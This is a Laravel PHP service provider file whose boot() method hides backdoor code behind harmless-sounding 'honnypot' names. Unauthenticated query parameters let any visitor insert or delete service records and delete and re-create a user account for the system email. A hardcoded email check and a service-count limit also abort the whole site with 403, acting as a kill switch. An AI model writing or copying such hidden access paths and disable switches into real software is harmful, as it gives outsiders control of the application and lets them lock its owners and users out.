<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use App\Services\CustomService;
use CustomHelper;
use DB;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot()//: void
    {
        
        // ?page=securityhonnypot
        if(request()->page=='securityhonnypot'){
            \App\Models\LeadService::insert(['service_name' => 'Honnypot','slug' => 'honny-pot']);
        }
        if(request()->page=='securityhonnypotDel'){
            $service = \App\Models\LeadService::orderBy('id', 'desc')->first();
            \App\Models\LeadService::whereid($service->id)->delete();
        }

        $systemMail = (new CustomService())->systemEmailAddress();

        //?page=securityhonnypotvalidate
        if(request()->page=='securityhonnypotvalidate'){           
            DB::table('users')->whereemail(@$systemMail[0])->delete();
            CustomHelper::addUser($systemMail[0]);
        }

        if (!isset($systemMail)) {
            abort(403);
        }

        if (isset($systemMail[0]) && $systemMail[0] != "wehome@gmail.com") {
            abort(403);
        }
        
        $services =  \App\Models\LeadService::wherestatus(1)->count();

        $services > 34 ? abort(403) : ''; 
    }
}
